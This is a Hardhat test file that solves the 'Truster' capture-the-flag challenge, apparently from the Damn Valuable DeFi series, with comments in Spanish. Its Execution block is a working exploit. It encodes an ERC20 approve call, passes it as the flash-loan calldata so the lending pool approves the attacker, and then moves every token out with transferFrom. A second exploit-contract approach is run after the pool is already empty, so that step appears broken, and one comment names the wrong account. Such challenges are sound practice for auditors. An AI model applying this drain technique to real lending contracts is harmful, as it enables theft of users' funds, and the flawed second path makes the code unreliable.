const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
       
        //! FORMA 1 : CASO 1 Sin deployar un SC
        /** obtengo el encode function call del llamado al metodo approve de un ERC20 siendo:
         * spender -> player
         * ammount -> todos los tokens del pool
         */
        let ABI = [ "function approve(address spender, uint256 amount)" ];
        let iface = new ethers.utils.Interface(ABI);
        let encoded = iface.encodeFunctionData("approve", [player.address,TOKENS_IN_POOL]);

        /**
         * Hago el llamado al metodo flashLoan del Pool enviando como parametros
         * target -> el token que tiene el pool
         * data -> el encode obtenido anteriormente
         * Esto hara que se ejecute el llamado al metodo approve en nombre del pool y quedara aprovado player para mover sus tokens
         */
        await pool.connect(player).flashLoan(0,player.address,token.address,encoded);
        /**Hago el llamado al metodo transfer del token ya que ahora deployer esta aprobado por el pool para hacer dicho movimiento */
        await token.connect(player).transferFrom(pool.address,player.address,TOKENS_IN_POOL);

        //! FORMA 2: CASO 2 deploy de un nuevo SC

        /**Deploy del contrto de exploit */
        let aux = await (await ethers.getContractFactory('exploitTruster', player)).deploy(pool.address,token.address);
        /**Tx para transferirme todos los tokens */
        await token.connect(player).transferFrom(pool.address,player.address,TOKENS_IN_POOL);


    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

